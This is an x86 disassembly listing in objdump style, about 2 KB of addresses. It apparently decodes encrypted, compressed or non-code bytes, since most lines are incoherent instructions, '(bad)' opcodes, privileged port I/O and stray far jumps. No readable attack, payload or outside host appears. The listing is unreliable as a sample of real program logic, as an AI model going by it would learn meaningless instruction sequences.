  41122b:	inc    ebx
  41122c:	adc    eax,0x34fa190
  411231:	xchg   esp,eax
  411232:	cmp    dl,ch
  411234:	cwde   
  411235:	(bad)  
  411236:	push   cs
  411237:	jne    0x4111e3
  411239:	jmp    0x2d96:0xc2795ddf
  411240:	fadd   QWORD PTR [ebx+eax*4+0x10]
  411244:	mov    ah,0xa4
  411246:	(bad)  
  411248:	arpl   WORD PTR [ecx],sp
  41124a:	pop    ds
  41124b:	pop    esi
  41124c:	xchg   BYTE PTR [esi+0x24],cl
  41124f:	mov    cl,0x39
  411251:	push   ss
  411252:	mov    ebp,0x1777f110
  411257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411258:	xchg   esi,eax
  411259:	stc    
  41125a:	pushf  
  41125b:	icebp  
  41125c:	push   ebx
  41125d:	mov    bl,0xec
  41125f:	mov    edx,0x363009fe
  411264:	pop    ecx
  411265:	lahf   
  411266:	ds or  eax,0x25c347bd
  41126c:	std    
  41126d:	push   ss
  41126e:	xor    edi,ecx
  411270:	adc    eax,0x43ed9b7c
  411275:	fist   WORD PTR [edx]
  411277:	inc    ebx
  411278:	mov    edi,0x6848468f
  41127d:	cmp    eax,0xc4995b3d
  411282:	add    al,0x87
  411284:	push   cs
  411285:	repz push 0x42abe39c
  41128b:	repz mov bh,0xaf
  41128e:	outs   dx,DWORD PTR ds:[esi]
  41128f:	fwait
  411290:	adc    ah,dl
  411292:	into   
  411293:	nop
  411294:	pop    ebx
  411295:	call   0xf86c:0xd6a68595
  41129c:	bound  ebx,QWORD PTR [edi+eax*2]
  41129f:	popf   
  4112a0:	pop    ss
  4112a1:	inc    eax
  4112a2:	std    
  4112a3:	add    BYTE PTR [edx+0x6ae57930],0x21
  4112aa:	(bad)
  4112ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112af:	call   0x4b7f0a74
  4112b4:	mov    ds:0x7b189900,al
  4112b9:	lahf   
  4112ba:	lahf   
  4112bb:	ret    0x9f7
  4112be:	xlat   BYTE PTR ds:[ebx]
  4112bf:	les    esp,FWORD PTR ds:0x2d170de0
  4112c5:	push   cs
  4112c6:	dec    esp
  4112c7:	dec    eax
  4112c8:	jmp    0x41131c
  4112ca:	add    edi,DWORD PTR [edx]
  4112cc:	dec    esi
  4112cd:	neg    ch
  4112cf:	sbb    al,0xa6
  4112d1:	jl     0x411281
  4112d3:	loop   0x4112a7
  4112d5:	adc    al,0x8e
  4112d7:	scas   eax,DWORD PTR es:[edi]
  4112d8:	cdq    
  4112d9:	mov    eax,ds:0xb6542595
  4112de:	fiadd  WORD PTR [eax+edi*2]
  4112e1:	or     DWORD PTR [eax-0x7fce5855],edi
  4112e7:	push   esi
  4112e8:	xchg   ebp,eax
  4112e9:	jbe    0x41132d
  4112eb:	(bad)  
  4112ec:	push   eax
  4112ed:	test   al,0xc3
  4112ef:	dec    esp
  4112f0:	es leave 
  4112f2:	push   esi
  4112f3:	outs   dx,BYTE PTR ds:[esi]
  4112f4:	mov    ss,WORD PTR ds:0x1fa6236
  4112fa:	mov    ds,WORD PTR [ebx]
  4112fc:	icebp  
  4112fd:	xchg   edi,eax
  4112fe:	add    esi,DWORD PTR [ecx-0x76cf1616]
  411304:	std    
  411305:	mov    dl,0xbe
  411307:	mov    cl,BYTE PTR [edi]
  411309:	leave  
  41130a:	fst    st(0)
  41130c:	cwde   
  41130d:	fimul  WORD PTR [ecx]
  41130f:	inc    ecx
  411310:	sahf   
  411311:	nop
  411312:	xchg   esi,eax
  411313:	mov    ch,0x16
  411315:	mov    edi,0x4410399f
  41131a:	test   eax,0x2e741b16
  41131f:	clc    
  411320:	and    edx,DWORD PTR [edi]
  411322:	leave  
  411323:	ret    
  411324:	pop    DWORD PTR ds:0x2115b4ad
  41132a:	test   DWORD PTR [ecx+0x24271968],ebp
  411330:	jmp    0x411373
  411332:	in     eax,0x30
  411334:	sbb    al,al
  411336:	pop    edx
  411337:	into   
  411338:	dec    esi
  411339:	mov    ebp,0x3f762f49
  41133e:	push   ebp
  41133f:	test   al,0x4e
  411341:	push   ecx
  411342:	push   ds
  411343:	xchg   ecx,eax
  411344:	jne    0x411334
  411346:	xor    cl,BYTE PTR [eax+0x9a59aae]
  41134c:	aad    0xcb
  41134e:	dec    eax
  41134f:	bound  esp,QWORD PTR [esi-0x288174e5]
  411355:	xchg   esi,eax
  411356:	aam    0x4d
  411358:	pop    ebp
  411359:	mov    eax,ds:0x19d7180e
  41135e:	inc    esp
  41135f:	test   BYTE PTR [ebp+0x1c],bh
  411362:	inc    esp
  411363:	ret    
  411364:	push   ebp
  411365:	stc    
  411366:	lds    eax,FWORD PTR [esi-0x37b1f770]
  41136c:	ret    0xd535
  41136f:	push   edx
  411370:	popf   
  411371:	ror    dh,1
  411373:	dec    eax
  411374:	loopne 0x41136f
  411376:	push   0x9268a2ba
  41137b:	ret    0xebfa
  41137e:	fcom   DWORD PTR [eax+0x50b0b9e5]
  411384:	imul   edi,DWORD PTR [edx],0x6f
  411387:	imul   esi,esi,0xffffffd6
  41138a:	lea    ebx,[edx]
  41138c:	fwait
  41138d:	(bad)  
  41138e:	es imul ebx,ebx,0xf43484d
  411395:	mov    ebp,0xac5e9616
  41139a:	or     al,0xaa
  41139c:	gs inc edx
  41139e:	call   0xa663bf8b
  4113a3:	and    ecx,DWORD PTR [eax+0x3fb39a80]
  4113a9:	dec    esp
  4113aa:	cwde   
  4113ab:	xlat   BYTE PTR ds:[ebx]
  4113ac:	popf   
  4113ad:	jo     0x411336
  4113af:	jb     0x411388
  4113b1:	sbb    bh,BYTE PTR [edx]
  4113b3:	rol    BYTE PTR [ecx-0x7d],1
  4113b6:	adc    ch,BYTE PTR [ebp+0x1c]
  4113b9:	xor    ebp,eax
  4113bb:	les    ebp,FWORD PTR [ecx+0x59]
  4113be:	in     al,dx
  4113bf:	jp     0x411350
  4113c1:	xor    DWORD PTR [esi+edi*8],ecx
  4113c4:	stos   DWORD PTR es:[edi],eax
  4113c5:	xor    al,BYTE PTR [edx]
  4113c7:	mov    ds:0x36cef313,al
  4113cc:	rcl    BYTE PTR [edx-0x39],cl
  4113cf:	out    0xee,al
  4113d1:	test   DWORD PTR [ebx-0x642d6e79],eax
  4113d7:	mov    edx,0x6fdba686
  4113dc:	pop    esp
  4113dd:	lods   eax,DWORD PTR ds:[esi]
  4113de:	xchg   ebx,eax
  4113df:	adc    BYTE PTR [ebp-0x43],dl
  4113e2:	adc    eax,0x8fe7d797
  4113e7:	jne    0x41137c
  4113e9:	jns    0x41137f
  4113eb:	imul   BYTE PTR [eax+ebp*2+0x3be70d3]
  4113f2:	mov    dh,0x7b
  4113f4:	addr16 pop esp
  4113f6:	xchg   ebp,eax
  4113f7:	stos   BYTE PTR es:[edi],al
  4113f8:	inc    ebx
  4113f9:	cdq    
  4113fa:	xchg   BYTE PTR [ebx-0x40],dl
  4113fd:	out    0x17,al
  4113ff:	cwde   
  411400:	daa    
  411401:	out    0x9,eax
  411403:	dec    ebx
  411404:	imul   ebp,esp,0xffffffae
  411407:	push   edi
  411408:	mov    al,0x76
  41140a:	cmp    eax,ebx
  41140c:	jo     0x411415
  41140e:	or     ebp,DWORD PTR [ebp+0x25c72565]
  411414:	fsubr  QWORD PTR [ebp-0x47b416f]
  41141a:	xchg   edi,eax
  41141b:	dec    ebx
  41141c:	pop    ebx
  41141d:	cs pop es
  41141f:	adc    eax,0xe464499
  411424:	retf   
  411425:	(bad)  
  411426:	jge    0x41143e
  411428:	push   esi
  411429:	sub    cl,cl
  41142b:	and    edi,DWORD PTR [edi+esi*8-0x78]
  41142f:	cld    
  411430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411431:	mov    bh,0x86
  411433:	retf   
  411434:	int3   
  411435:	(bad)  
  411436:	mov    esi,0x2017dab0
  41143b:	push   ecx
  41143c:	aam    0x4a
  41143e:	popf   
  41143f:	or     al,0x8b
  411441:	inc    ebp
  411442:	dec    ebx
  411443:	add    cl,bl
  411445:	scas   eax,DWORD PTR es:[edi]
  411446:	pop    ds
  411447:	mov    dh,0x0
  411449:	ins    BYTE PTR es:[edi],dx
  41144a:	dec    esp
  41144b:	cli    
  41144c:	imul   esi,DWORD PTR [edx],0x8e539ccd
  411452:	sar    DWORD PTR [eax+0x6899a617],cl
  411458:	or     ecx,DWORD PTR [ecx+0x21]
  41145b:	mov    ebx,0x898953b6
  411460:	add    DWORD PTR [ebx],ebp
  411462:	jmp    0x4114e0
  411464:	loop   0x4113fb
  411466:	sub    eax,0xa01fce72
  41146b:	xor    BYTE PTR [esi+ebx*8-0x7bca320b],ch
  411472:	jp     0x4113fb
  411474:	or     al,dh
  411476:	cmp    eax,0x99b2695f
  41147b:	stos   DWORD PTR es:[edi],eax
  41147c:	jno    0x4114f6
  41147e:	out    dx,al
  41147f:	lds    esi,FWORD PTR [edx]
  411481:	fs jge 0x4114d2
  411484:	mov    esp,0x63e4c7e3
  411489:	mov    dh,0x9a
  41148b:	pop    edx
  41148c:	or     BYTE PTR [ecx-0x1b],al
  41148f:	add    DWORD PTR [edi+0x2a],ebx
  411492:	adc    BYTE PTR [ebx-0x67],bh
  411495:	cmp    al,BYTE PTR [edi+edi*1-0x43]
  411499:	sbb    DWORD PTR [ecx+0x72bec2cb],ebx
  41149f:	mov    BYTE PTR [edi-0x17],dl
  4114a2:	pop    es
  4114a3:	loop   0x411508
  4114a5:	push   cs
  4114a6:	arpl   WORD PTR [edx+0x2e],sp
  4114a9:	lahf   
  4114aa:	mov    esp,ebx
  4114ac:	add    eax,0x48a038c1
  4114b1:	ins    DWORD PTR es:[edi],dx
  4114b2:	or     BYTE PTR [edi-0x5d],cl
  4114b5:	loope  0x411453
  4114b7:	and    DWORD PTR [ebp+0x77d68261],0x5eefa1e
  4114c1:	das    
  4114c2:	outs   dx,DWORD PTR ds:[esi]
  4114c3:	out    0x8b,eax
  4114c5:	mov    DWORD PTR [edi+0x32],eax
  4114c8:	pop    edx
  4114c9:	repnz iret 
  4114cb:	std    
  4114cc:	sbb    ebp,esp
  4114ce:	xchg   ecx,eax
  4114cf:	call   0x740c:0xb93a8edb
  4114d6:	pop    ss
  4114d7:	mov    dh,0x1c
  4114d9:	mov    dl,0x30
  4114db:	es (bad) 
  4114dd:	mov    eax,ds:0x4511d4af
  4114e2:	ret    
  4114e3:	mov    ds:0x642f5cb7,al
  4114e8:	pop    esi
  4114e9:	and    eax,0x2874265e
  4114ee:	xlat   BYTE PTR ds:[ebx]
  4114ef:	mov    edi,0xc8663cb
  4114f4:	imul   esp,DWORD PTR [ebp-0x410422d5],0x828aad4
  4114fe:	mov    dh,0xe
  411500:	les    ebp,FWORD PTR [edx]
  411502:	in     al,0x2e
  411504:	adc    DWORD PTR [ecx-0x4935ab95],0xffffff90
  41150b:	add    eax,0x318a5b08
  411510:	out    dx,eax
  411511:	in     eax,0x6f
  411513:	inc    ebp
  411514:	pop    ebp
  411515:	(bad)  
  411517:	xchg   edx,eax
  411518:	xchg   ebx,eax
  411519:	(bad)  
  41151a:	out    0xb,eax
  41151c:	push   ecx
  41151d:	pop    eax
  41151e:	out    dx,al
  41151f:	adc    BYTE PTR [esp+ebp*1],dh
  411522:	or     DWORD PTR [edi],ebx
  411524:	jae    0x4114c1
  411526:	pop    edx
  411527:	pop    ebp
  411528:	bound  ebp,QWORD PTR [esi+0x5c]
  41152b:	mov    bl,BYTE PTR [ebp-0x18f744d9]
  411531:	fcomp  DWORD PTR ds:0xbfe91369
  411537:	int3   
  411538:	aam    0x91
  41153a:	xor    ebp,DWORD PTR [esi+0x60]
  41153d:	or     dh,BYTE PTR [ebx+0x4a568bbf]
  411543:	xor    al,0x4d
  411545:	push   ebp
  411546:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  411548:	or     BYTE PTR [esi+0x45],dh
  41154b:	(bad)  
  41154c:	sbb    eax,DWORD PTR [ecx-0x2b]
  41154f:	stos   DWORD PTR es:[edi],eax
  411550:	mov    esp,0x7022c7cd
  411555:	fst    DWORD PTR [ecx-0x3a787756]
  41155b:	and    edi,DWORD PTR [ecx+0x15]
  41155e:	aaa    
  41155f:	retf   
  411560:	add    DWORD PTR [edi+0x66],eax
  411563:	ret    
  411564:	jp     0x411507
  411566:	or     DWORD PTR [eax+0x33],ecx
  411569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41156a:	popf   
  41156b:	cmp    DWORD PTR [edi],edx
  41156d:	iret   
  41156e:	xchg   ebx,eax
  41156f:	push   es
  411570:	xor    BYTE PTR [ebp-0x26],ch
  411573:	jle    0x4115af
  411575:	pop    ds
  411576:	pop    es
  411577:	xchg   ecx,eax
  411578:	jb     0x41156e
  41157a:	out    0x8,eax
  41157c:	scas   eax,DWORD PTR es:[edi]
  41157d:	pop    ebp
  41157e:	push   ebx
  41157f:	mov    DWORD PTR [ecx+0x3e71b518],edx
  411585:	loopne 0x41155a
  411587:	loopne 0x411574
  411589:	aaa    
  41158a:	xchg   esi,eax
  41158b:	stc    
  41158c:	and    ecx,DWORD PTR [ebp+0xd]
  41158f:	mov    esp,0xff1b9660
  411594:	push   ebx
  411595:	jle    0x411545
  411597:	test   DWORD PTR [ecx],edx
  411599:	out    dx,al
  41159a:	push   eax
  41159b:	adc    bl,dh
  41159d:	xor    eax,0xcd2a5549
  4115a2:	enter  0x6052,0x88
  4115a6:	int    0x75
  4115a8:	leave  
  4115a9:	scas   al,BYTE PTR es:[edi]
  4115aa:	mov    eax,0xfd191082
  4115af:	inc    ebp
  4115b0:	inc    ecx
  4115b1:	jge    0x411558
  4115b3:	fldenv [esi-0x1d]
  4115b6:	pop    ds
  4115b7:	inc    ecx
  4115b8:	or     cl,BYTE PTR [ebp-0x62608f50]
  4115be:	dec    esp
  4115bf:	add    al,0x8f
  4115c1:	pusha  
  4115c2:	mov    ch,0x47
  4115c4:	mov    edx,0xea98484
  4115c9:	es repnz pop edx
  4115cc:	and    eax,0xae348f0b
  4115d1:	sub    eax,0x11b21281
  4115d6:	retf   
  4115d7:	xchg   esp,eax
  4115d8:	test   BYTE PTR [esi-0x6e5ec5b8],dh
  4115de:	out    0x6e,al
  4115e0:	aam    0x7c
  4115e2:	outs   dx,BYTE PTR ds:[esi]
  4115e3:	out    dx,eax
  4115e4:	sub    BYTE PTR [esi-0x68],dl
  4115e7:	or     DWORD PTR [ebx+0x7ffc8bd3],esp
  4115ed:	mov    esi,0xaae7669e
  4115f2:	sub    BYTE PTR [edx],bl
  4115f4:	jae    0x4115a2
  4115f6:	push   ecx
  4115f7:	xor    eax,ebx
  4115f9:	mov    DWORD PTR [esi+ebp*1-0x79],ecx
  4115fd:	jl     0x4115e3
  4115ff:	rcl    DWORD PTR [esi-0x34fadabd],0xe7
  411606:	mov    ah,0x5a
  411608:	jecxz  0x411653
  41160a:	push   ss
  41160b:	fs jecxz 0x4115be
  41160e:	cmp    DWORD PTR ds:0xa0230533,esi
  411614:	mov    dl,0xcf
  411616:	adc    BYTE PTR [ecx-0x79e7ed61],al
  41161c:	shr    DWORD PTR [esi+0x69],1
  41161f:	add    eax,0xe0e407fd
  411624:	push   edx
  411625:	imul   ebp,DWORD PTR [ebp-0xa13c77c],0x50
  41162c:	jno    0x411643
  41162e:	fldenv [edx+0x5b5dbc34]
  411634:	fist   DWORD PTR [eax+0xe4e39ed]
  41163a:	or     BYTE PTR [esi-0x3a],bl
  41163d:	and    dh,ah
  41163f:	jmp    0x41167a
  411641:	fs adc al,0xef
  411644:	xor    BYTE PTR [ebp+0x20c1d713],dl
  41164a:	pop    es
  41164b:	fisttp QWORD PTR [eax+0x38649c22]
  411651:	cwde   
  411652:	repz dec eax
  411654:	push   cs
  411655:	sub    BYTE PTR [eax+eax*1],dl
  411658:	js     0x4116ba
  41165a:	leave  
  41165b:	pop    edx
  41165c:	push   esi
  41165d:	cmp    al,BYTE PTR [eax+0x73]
  411660:	mov    ds:0x7241d94f,al
  411665:	push   ebx
  411666:	jae    0x41161f
  411668:	jle    0x411641
  41166a:	pushf  
  41166b:	xor    eax,0xc42f0b70
  411670:	or     al,BYTE PTR [edx-0x17]
  411673:	sub    DWORD PTR ds:0xafae8843,eax
  411679:	mov    dl,0x7e
  41167b:	dec    esi
  41167c:	hlt    
  41167d:	imul   esi,DWORD PTR [esi-0x61c193c7],0xffffff97
  411684:	xchg   esp,eax
  411685:	je     0x4116f1
  411687:	lock imul edi,DWORD PTR [esi+0x49],0xad0a98b8
  41168f:	outs   dx,DWORD PTR ds:[esi]
  411690:	jg     0x4116e2
  411692:	mov    bl,BYTE PTR [edi-0x5]
  411695:	jnp    0x411710
  411697:	jge    0x4116db
  411699:	stos   BYTE PTR es:[edi],al
  41169a:	mov    ebx,0xf1d10bc3
  41169f:	test   eax,0xe469c42b
  4116a4:	jno    0x4116cb
  4116a6:	mov    ch,al
  4116a8:	mul    DWORD PTR [esi-0x6a2ffd7d]
  4116ae:	cmp    bh,BYTE PTR [eax+0x11]
  4116b1:	mov    edi,0x1cacef47
  4116b6:	fcom   DWORD PTR [edi+0x3]
  4116b9:	in     eax,dx
  4116ba:	lahf   
  4116bb:	in     al,dx
  4116bc:	rcl    DWORD PTR ds:0x4f8d8a9e,cl
  4116c2:	cmp    ebp,DWORD PTR [edx+ecx*1-0x144a1f2b]
  4116c9:	adc    eax,0xc6891864
  4116ce:	scas   eax,DWORD PTR es:[edi]
  4116cf:	cli    
  4116d0:	pop    eax
  4116d1:	sub    al,0x27
  4116d3:	pushf  
  4116d4:	rcl    ebp,cl
  4116d6:	add    bh,BYTE PTR [edx]
  4116d8:	jp     0x41165c
  4116da:	mov    al,0xc0
  4116dc:	lea    edx,[edi]
  4116de:	push   cs
  4116df:	fld    QWORD PTR [ebp-0x3bb96cc6]
  4116e5:	push   0xffffffec
  4116e7:	xchg   edi,eax
  4116e8:	lods   eax,DWORD PTR ds:[esi]
  4116e9:	(bad)  
  4116ea:	ins    DWORD PTR es:[edi],dx
  4116eb:	mov    al,ds:0xdebbb495
  4116f0:	(bad)  
  4116f1:	jmp    FWORD PTR [edi+0x53]
  4116f4:	jg     0x4116f1
  4116f6:	test   ch,ch
  4116f8:	jno    0x4116cb
  4116fa:	cmp    bh,BYTE PTR [ebx-0x1f33ca4c]
  411700:	loope  0x411689
  411702:	pop    ss
  411703:	adc    esp,DWORD PTR [eax-0x6b]
  411706:	sar    BYTE PTR [esi+0x2891bbd2],cl
  41170c:	sub    BYTE PTR [edi+0x104e6211],cl
  411712:	aad    0xb5
  411714:	mov    eax,0x6fcc97df
  411719:	mov    ah,0x95
  41171b:	mov    ds:0x53157777,al
  411720:	rol    dh,0xf9
  411723:	mov    cl,0x9d
  411725:	fist   DWORD PTR [ecx]
  411727:	xor    dh,ah
  411729:	(bad)  
  41172b:	or     ebp,DWORD PTR [ebp-0x70228478]
  411731:	call   0xdb1f20fb
  411736:	(bad)  
  411737:	mov    cl,0x1e
  411739:	adc    al,0x6
  41173b:	push   edi
  41173c:	data16 mov BYTE PTR [edx],al
  41173f:	dec    esi
  411740:	lods   eax,DWORD PTR ds:[esi]
  411741:	dec    esi
  411742:	sbb    ch,dh
  411744:	xchg   edx,eax
  411745:	mov    ?,WORD PTR [esi+esi*1]
  411748:	pop    esi
  411749:	call   0xaef4690c
  41174e:	push   ebx
  41174f:	mov    eax,0x578b5d15
  411754:	fs mov cl,0x40
  411757:	mov    bh,0x35
  411759:	adc    al,0x14
  41175b:	xchg   ebp,eax
  41175c:	or     al,ah
  41175e:	test   DWORD PTR [ebx-0xa2bf015],edx
  411764:	sub    eax,0x537c0bc6
  411769:	jae    0x411739
  41176b:	and    ch,BYTE PTR [ebx]
  41176d:	scas   eax,DWORD PTR es:[edi]
  41176e:	loopne 0x41174b
  411770:	mov    edx,0x3040a6b1
  411775:	enter  0x62f2,0x8d
  411779:	adc    al,0x26
  41177b:	pop    esp
  41177c:	and    dh,dh
  41177e:	arpl   WORD PTR [ebx+0x23212e40],bp
  411784:	sbb    esi,esi
  411786:	pop    ds
  411787:	test   DWORD PTR [eax+0x797a834f],ecx
  41178d:	xlat   BYTE PTR ds:[ebx]
  41178e:	or     eax,0xf74a9343
  411793:	adc    edi,DWORD PTR [eax+0x17]
  411796:	adc    al,al
  411798:	in     eax,dx
  411799:	fwait
  41179a:	jne    0x4117b4
  41179c:	adc    dh,BYTE PTR [ecx+0x73ee8297]
  4117a2:	mov    al,BYTE PTR [ebp-0x2326e155]
  4117a8:	jmp    0xc11cf61b
  4117ad:	adc    eax,0x6f4e53e4
  4117b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117b3:	in     al,0xb4
  4117b5:	mov    dl,0x78
  4117b7:	jns    0x411823
  4117b9:	mov    dh,0x8c
  4117bb:	aad    0xb5
  4117bd:	ja     0x411837
  4117bf:	mov    ah,0xad
  4117c1:	jno    0x411768
  4117c3:	sub    dl,BYTE PTR [ebp-0x16e4d8ba]
  4117c9:	inc    edi
  4117ca:	les    esp,FWORD PTR [edi-0x6]
  4117cd:	je     0x411813
  4117cf:	fisubr DWORD PTR [edx+0x4011592c]
  4117d5:	ficomp DWORD PTR [esi+0x27262401]
  4117db:	xlat   BYTE PTR ds:[ebx]
  4117dc:	loopne 0x4117b6
  4117de:	push   ebp
  4117df:	daa    
  4117e0:	aad    0x82
  4117e2:	call   0x75f3e8de
  4117e7:	rcr    al,cl
  4117e9:	mov    cl,dl
  4117eb:	xor    al,0x25
  4117ed:	xor    esp,DWORD PTR [edx+0xb]
  4117f0:	jle    0x4117b6
  4117f2:	out    dx,eax
  4117f3:	push   esi
  4117f4:	mov    bl,0x2b
  4117f6:	xor    eax,0xf2a652e5
  4117fb:	add    eax,0xa58f9e5e
  411800:	mov    DWORD PTR [ebx+0x3f4e4e0f],ebp
  411806:	sub    BYTE PTR [edi],dh
  411808:	fisub  DWORD PTR [edx-0x51]
  41180b:	jb     0x4117e0
  41180d:	in     eax,0x72
  41180f:	dec    esi
  411810:	dec    ebp
  411811:	stc    
  411812:	cld    
  411813:	jno    0x41186c
  411815:	mov    BYTE PTR [esi+edx*2+0x5fa9826a],ch
  41181c:	stos   BYTE PTR es:[edi],al
  41181d:	pop    ds
  41181e:	loope  0x411885
  411820:	cmp    eax,0xe5af7194
  411825:	stc    
  411826:	ss in  al,dx
  411828:	bound  esp,QWORD PTR [esp+ecx*4]
  41182b:	add    ecx,DWORD PTR [ebx]
  41182d:	std    
  41182e:	cmp    dl,ch
  411830:	adc    ah,ah
  411832:	push   0xed98a41f
  411837:	in     eax,dx
  411838:	push   0x19
  41183a:	push   ss
  41183b:	cs jno 0x4117f1
  41183e:	das    
  41183f:	jle    0x411813
  411841:	pop    esi
  411842:	lahf   
  411843:	mov    al,0xc7
  411845:	cmp    esi,ecx
  411847:	in     eax,dx
  411848:	stos   DWORD PTR es:[edi],eax
  411849:	adc    dl,BYTE PTR [ecx+0x32]
  41184c:	jg     0x411855
  41184e:	out    dx,eax
  41184f:	adc    eax,0xe7ad964c
  411854:	stos   BYTE PTR es:[edi],al
  411855:	mov    WORD PTR [ecx-0x7d94ee7f],cs
  41185b:	add    eax,0x45b24d0c
  411860:	xchg   ebp,eax
  411861:	shl    DWORD PTR [eax+0x6cad2c5e],0xe8
  411868:	lods   eax,DWORD PTR ss:[esi]
  41186a:	jbe    0x41185e
  41186c:	sub    ebp,edx
  41186e:	out    0x84,eax
  411870:	sti    
  411871:	outs   dx,BYTE PTR ds:[esi]
  411872:	repnz in al,0xde
  411875:	mov    al,0xc0
  411877:	arpl   WORD PTR [esi],di
  411879:	int    0xfb
  41187b:	fs stos BYTE PTR es:[edi],al
  41187d:	in     eax,dx
  41187e:	xor    DWORD PTR [edx-0x33],ebx
  411881:	jno    0x41181d
  411883:	std    
  411884:	push   ss
  411885:	fiadd  WORD PTR [ebp+0x34e211d6]
  41188b:	fistp  WORD PTR [ebx]
  41188d:	adc    DWORD PTR [ebx-0x6d],ebp
  411890:	js     0x4118bb
  411892:	int    0xed
  411894:	pop    ecx
  411895:	dec    ecx
  411896:	cs push eax
  411898:	shl    DWORD PTR [ecx],cl
  41189a:	jge    0x41187b
  41189c:	loopne 0x4118ab
  41189e:	jge    0x411906
  4118a0:	into   
  4118a1:	cld    
  4118a2:	inc    edi
  4118a3:	shl    DWORD PTR [eax-0x54],1
  4118a6:	cmp    esi,DWORD PTR [edx+ecx*8+0x4ae20bb0]
  4118ad:	mov    WORD PTR [edx+0x14709274],cs
  4118b3:	mov    esi,0xa79f20b6
  4118b8:	(bad)  
  4118b9:	(bad)  
  4118ba:	fldenv [ebp+0x4f3869e0]
  4118c0:	jl     0x411912
  4118c2:	out    dx,al
  4118c3:	(bad)  
  4118c4:	(bad)  
  4118c5:	or     eax,DWORD PTR [edx]
  4118c7:	or     bh,BYTE PTR [ebx-0x75f258f1]
  4118cd:	ins    DWORD PTR es:[edi],dx
  4118ce:	int    0xe9
  4118d0:	push   edi
  4118d1:	adc    al,0xb3
  4118d3:	sbb    al,0x80
  4118d5:	pop    esp
  4118d6:	mov    WORD PTR [edx+eiz*1-0x3fffd266],?
  4118dd:	rcl    DWORD PTR [eax],0x41
  4118e0:	lods   eax,DWORD PTR ds:[esi]
  4118e1:	pop    esi
  4118e2:	mov    ds:0x585c323e,eax
  4118e7:	(bad)  [edi]
  4118e9:	xor    edx,ecx
  4118eb:	mov    ds:0x1691f5fe,eax
  4118f0:	push   edx
  4118f1:	sahf   
  4118f2:	mov    ds:0xb28af58,eax
  4118f7:	aad    0xae
  4118f9:	xchg   ebx,eax
  4118fa:	test   dh,cl
  4118fc:	add    BYTE PTR [esi+0x2e],cl
  4118ff:	jle    0x411943
  411901:	pop    esp
  411902:	std    
  411903:	repz in eax,dx
  411905:	mov    cl,0xe9
  411907:	pop    esp
  411908:	add    ebx,eax
  41190a:	sahf   
  41190b:	push   ecx
  41190c:	mov    ebx,0xfea69e7a
  411911:	fstp   DWORD PTR [edx-0x7c70017b]
  411917:	jae    0x4118b4
  411919:	lahf   
  41191a:	adc    ch,ah
  41191c:	mov    ecx,DWORD PTR [ebx-0x792d765a]
  411922:	dec    esi
  411923:	sub    al,ah
  411925:	and    dh,cl
  411927:	dec    ecx
  411928:	jnp    0x411924
  41192a:	clc    
  41192b:	iret   
  41192c:	or     al,cl
  41192e:	add    al,BYTE PTR [eax-0x80]
  411931:	jae    0x411920
  411933:	(bad)  
  411934:	jns    0x411982
  411936:	cs ins BYTE PTR es:[edi],dx
  411938:	dec    ebp
  411939:	xor    al,0x41
  41193b:	maskmovq mm0,(bad)
  41193c:	test   DWORD PTR [esi+0x64],0xf344486b
  411943:	and    al,0x51
  411945:	xor    ah,dh
  411947:	fxch   st(0)
  411949:	jecxz  0x411938
  41194b:	push   0xe01b59c4
  411950:	jp     0x411906
  411952:	push   esp
  411953:	xor    eax,0xb394eaa7
  411958:	adc    eax,0xd9e8fd82
  41195d:	gs push cs
  41195f:	sti    
  411960:	popa   
  411961:	(bad)  
  411962:	push   ds
  411963:	mov    eax,ds:0xfcd44bab
  411968:	dec    esp
  411969:	das    
  41196a:	or     al,0x37
  41196c:	pop    esp
  41196d:	cs push ebp
  41196f:	out    0x4a,al
  411971:	outs   dx,BYTE PTR ds:[esi]
  411972:	loop   0x411903
  411974:	sub    eax,0xfe6e6a10
  411979:	push   eax
  41197a:	add    eax,0xba9fcdd
  41197f:	sbb    eax,0x12cc4860
  411984:	loop   0x411933
  411986:	pushf  
  411987:	es pushf 
  411989:	mov    bh,al
  41198b:	fdivr  DWORD PTR [ebp-0x19b99ac]
  411991:	es dec esp
  411993:	sub    DWORD PTR ds:0x35c812f4,0x739de2c4
  41199d:	xor    al,0x49
  41199f:	pop    edx
  4119a0:	sbb    BYTE PTR [ebp+0x3],0x5a
  4119a4:	sbb    DWORD PTR [esi+0x3d],edx
  4119a7:	ret    
  4119a8:	lahf   
  4119a9:	mov    eax,0xb35c09a3
  4119ae:	fmulp  st(7),st
  4119b0:	icebp  
  4119b1:	int    0x5d
  4119b3:	je     0x411998
  4119b5:	gs fcmovnb st,st(2)
  4119b8:	and    BYTE PTR [esi],dl
  4119ba:	imul   ebp,DWORD PTR [ebx],0x34502376
  4119c0:	rcl    DWORD PTR [edx-0x76],0xbf
  4119c4:	mov    eax,0xdcfcabe1
  4119c9:	mov    bl,0x3a
  4119cb:	lea    ecx,[ebx+0x37]
  4119ce:	(bad)  
  4119cf:	dec    edx
  4119d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119d1:	ror    BYTE PTR [ebx-0x1b777f38],0x89
  4119d8:	stc    
  4119d9:	ret    
  4119da:	leave  
  4119db:	shl    DWORD PTR [ebx],cl
  4119dd:	retf   
  4119de:	cmp    al,0x16
  4119e0:	mov    ah,0xa9
  4119e2:	loopne 0x4119e5
  4119e4:	cli    
  4119e5:	mov    eax,cs
  4119e7:	mov    edx,0x74fa5142
  4119ec:	xchg   esp,eax
  4119ed:	mov    al,ds:0xf3b8c136
  4119f2:	pop    es
  4119f3:	mov    BYTE PTR [edi+eiz*8+0x7f],ch
  4119f7:	xor    bh,BYTE PTR [esi]
  4119f9:	clc    
  4119fa:	and    BYTE PTR [ebp-0x43],bh
  4119fd:	sub    eax,0x6fc5f699
  411a02:	into   
  411a03:	ss and ah,dl
  411a06:	sti    
  411a07:	pop    esp
  411a08:	out    dx,al
  411a09:	inc    esi
  411a0a:	int3   
  411a0b:	inc    edi
  411a0c:	sti    
  411a0d:	in     eax,dx
  411a0e:	inc    eax
  411a0f:	pop    eax
  411a10:	cmp    al,0xe4
  411a12:	cmp    DWORD PTR [edi],edx
  411a14:	mov    esi,0x5c26e7bd
  411a19:	adc    BYTE PTR [ebx-0x78],ch
